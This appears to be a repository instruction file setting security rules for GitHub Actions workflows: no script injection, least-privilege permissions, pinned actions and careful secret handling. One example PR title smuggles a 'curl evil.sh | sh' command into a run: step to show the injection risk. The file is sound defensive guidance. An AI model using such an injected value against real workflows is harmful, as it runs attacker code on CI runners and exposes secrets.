---
description: "Security guardrails for GitHub Actions workflow files: no script injection, least-privilege permissions, no secrets in logs."
applyTo: ".github/workflows/**/*.yml,.github/workflows/**/*.yaml"
---

# Workflow security contract

Applies to every file under `.github/workflows/`.

**The prohibition, in one line:** never interpolate an untrusted expression (`${{ github.event.issue.title }}`, `${{ github.event.pull_request.body }}`, `${{ github.head_ref }}`, `${{ github.event.comment.body }}`, any `inputs.*` of type `string`) directly inside a `run:` script. Pass it through the step's `env:` block and reference the environment variable.

```yaml
# ❌ script injection — a PR titled `"; curl evil.sh | sh; "` runs on the runner
- run: echo "Title: ${{ github.event.pull_request.title }}"

# ✅ data stays data
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $PR_TITLE"
```

## Rules

- Declare `permissions:` at workflow or job level with the **least** scopes needed (default `contents: read`). Never `write-all`.
- Never use `pull_request_target` together with a checkout of the PR head ref.
- Pin third-party actions to a full commit SHA; first-party `actions/*` may use a major version tag.
- Secrets only via `${{ secrets.NAME }}` mapped into `env:`; never `echo` them, never write them to files that get uploaded as artifacts.
- `copilot-setup-steps.yml` must keep exactly one job named `copilot-setup-steps`, and only use the keys the cloud agent honours (`steps`, `permissions`, `runs-on`, `services`, `snapshot`, `timeout-minutes`).

The full checklist and patterns live in the `workflow-development` skill.
